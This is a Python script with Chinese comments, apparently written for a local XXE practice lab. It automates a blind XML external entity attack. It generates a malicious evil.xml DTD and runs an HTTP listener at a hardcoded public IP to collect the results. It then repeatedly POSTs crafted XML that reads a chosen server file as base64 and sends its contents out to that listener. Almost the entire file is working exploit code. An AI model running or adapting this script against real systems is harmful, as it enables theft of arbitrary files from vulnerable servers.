#1.导入模块
#!/usr/bin/python3
#coding:utf-8
import threading
from http.server import HTTPServer,SimpleHTTPRequestHandler
import requests
import sys

#编写攻击payload的生成函数
def ExportPayload(lip,lport):
    file = open('evil.xml','w')
    file.write("<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://{0}:{1}/?content=%file;'>\"> %payload;".format(lip,lport))
    file.close()
    print("[*] payload文件创建成功！")

#开启http服务，接受数据
def StartHTTP(lip,lport):
    serverAddr = (lip,lport)
    httpd = HTTPServer(serverAddr,MyHandler)
    print("[*] 正在开启http服务器：\n\n================\nIP地址：{0}\n端口:{1}\n=============\n".format(lip,lport))
    httpd.serve_forever()


#通过POST发送攻击数据
def SendData(lip,lport,url):
    filePath = "c:\\test.txt"#需要读取的文件的路径（默认值）
    while True:
        filePath = filePath.replace("\\","/")
        data = "<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource={0}\">\n<!ENTITY % dtd SYSTEM \"http://{1}:{2}/evil.xml\">\n%dtd;\n%send;\n]>".format(filePath,lip,lport)
        requests.post(url,data=data)
        filePath = input("Input filePath:")

#定义一个消息处理类，用于重写消息日志
class MyHandler(SimpleHTTPRequestHandler):
    def log_message(self,format,*args):
        sys.stderr.write("%s -- [%s] %s\n" %(self.client_address[0],self.log_date_time_string(),format%args))#终端输出HTTP访问控制消息
        textFile = open("result1.txt",'a')
        textFile.write("%s -- [%s] %s\n" %(self.client_address[0],self.log_date_time_string(),format%args))
        #保存消息到文件

        textFile.close()

if __name__ == '__main__':
    lip = "144.34.183.18"
    lport = 3344
    url = "http://127.0.0.1/xxe-lab/php_xxe/doLogin.php"
    start=input("请输入需要启动客户端还是服务端 【1：客户端】 【2：服务端】：")
    if start == '1':
        SendData(lip,lport,url)
    elif start == '2':
        ExportPayload(lip,lport)
        threadHTTP = threading.Thread(target=StartHTTP,args=(lip, lport))
        threadHTTP.start()
    else:
        print('输入错误')

